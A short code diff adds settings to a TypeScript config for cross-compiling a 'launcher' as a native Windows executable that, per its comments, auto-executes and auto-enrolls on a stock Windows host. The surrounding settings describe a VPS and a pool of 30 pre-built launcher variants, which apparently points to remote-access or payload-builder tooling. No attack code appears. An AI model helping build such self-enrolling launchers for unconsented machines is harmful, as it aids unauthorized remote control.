@@ -63,6 +63,13 @@ export const env = {
   // Optional explicit path to the mono C# compiler for launcher builds
   // (default: `mcs` on PATH). The VPS needs mono-mcs only for launcher mode.
   MONO_MCS_PATH: optional("MONO_MCS_PATH", ""),
+  // Option 3: build the launcher as a NATIVE Windows PE (MinGW cross-compile)
+  // instead of Mono IL. `1` enables it; when on, the target needs no Mono/.NET
+  // runtime and auto-executes + auto-enrolls on a stock Windows host.
+  LAUNCHER_NATIVE: process.env["LAUNCHER_NATIVE"]?.trim() === "1",
+  // Cross compiler for the native path (build-native.sh default is
+  // `x86_64-w64-mingw32-gcc`).
+  NATIVE_CC: optional("NATIVE_CC", "x86_64-w64-mingw32-gcc"),
   // Warm launcher pool size (number of pre-compiled launcher variants kept).
   LAUNCHER_POOL_SIZE: number("LAUNCHER_POOL_SIZE", 30),
 };
